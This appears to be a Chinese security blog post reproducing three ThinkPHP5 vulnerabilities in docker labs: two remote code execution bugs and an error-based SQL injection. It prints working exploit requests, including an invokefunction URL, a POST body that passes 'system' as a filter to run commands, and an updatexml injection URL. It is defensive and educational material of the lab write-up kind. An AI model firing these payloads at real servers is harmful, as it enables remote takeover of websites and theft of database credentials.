---
title: Thinkphp5漏洞总结
date: 2019-03-13 16:45:28
categories: 中间件漏洞
tags: 漏洞复现

---
<blockquote class="blockquote-center">人生是个圆，有的人走了一辈子也没有走出命运画出的圆圈，其实，圆上的每一个点都有一条腾飞的切线。</blockquote>

<div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=194405&auto=1&height=66"></iframe></div>



# ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞



## 漏洞描述

ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。



## 漏洞等级

高级

## 漏洞危害

远程代码执行



## 漏洞检测方法

利用POC去试验是否存在该漏洞



## 漏洞利用方法

启动docker环境:

```
docker-compose up -d
```

![](http://ww1.sinaimg.cn/large/0078beR7ly1g0zd9tfx20j30o30njab8.jpg)

然后修改URL中的参数,构造POC,成功执行命令

![](http://ww1.sinaimg.cn/large/0078beR7ly1g0ze9m9nofj31710olmyw.jpg)

发送的数据包为:

```
http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1`
```

也可以执行其他命令,只需替换vars[0]的值即可



## 漏洞修复方案:

1,及时去thinkphp官网修补漏洞

2,更新到最新版



# ThinkPHP5 5.0.23 远程代码执行漏洞



## 漏洞描述

ThinkPHP是一款运用极广的PHP开发框架。其5.0.23以前的版本中，在获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。



## 漏洞等级

高级

## 漏洞危害

远程代码执行



## 漏洞检测方法

利用POC去试验是否存在该漏洞



## 漏洞利用方法

启动docker环境:

```
docker-compose up -d
```

![](http://ww1.sinaimg.cn/large/0078beR7ly1g0zd9tfx20j30o30njab8.jpg)

然后刷新页面,构造POC,成功执行命令

![](http://ww1.sinaimg.cn/large/0078beR7ly1g0zd4qm4p3j30vr0g6q4a.jpg)

发送的数据包为:

```
POST /index.php?s=captcha HTTP/1.1
Host: 192.168.136.128:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
```

也可以执行其他命令,只需替换server[REQUEST_METHOD]的值即可



## 漏洞修复方案:

1,及时去thinkphp官网修补漏洞

2,更新到最新版



# ThinkPHP5版本 SQL注入漏洞和敏感信息泄露漏洞



## 漏洞描述

ThinkPHP5版本存在一个鸡肋的SQL注入漏洞,可以获取到当前用户和密码以及数据库名等信息,详情参考:[<https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html>]()

## 漏洞等级

低危



## 漏洞危害

获取到数据库配置信息(用户名,密码,数据库名,主机名)



## 漏洞检测方法

利用POC去试验是否存在该漏洞



## 漏洞利用方法

启动docker环境:

```
docker-compose up -d
```

如果出现以下错误:

```
ERROR: Get https://registry-1.docker.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)
```

那么需要去修改`/etc/resolv.conf`修改为:

```
nameserver 8.8.8.8
nameserver 8.8.4.4
nameserver 10.0.0.10
```



访问以下URL进入网站,出现用户名表示成功访问:

```
http://Your-Ip/index.php?ids[]=1&ids[]=2
```

![](http://ww1.sinaimg.cn/large/0078beR7ly1g0zerz57y4j30i00fojro.jpg)

然后使用xpath报错的方法去构造POC,成功执行命令

请求的URL为:

http://192.168.136.128/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1



```
http://your-ip:8080/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1
```

![](http://ww1.sinaimg.cn/large/0078beR7ly1g0zf2z9v1ej30og0kf3zk.jpg)



## 漏洞修复方案:

1,及时去thinkphp官网修补漏洞

2,更新到最新版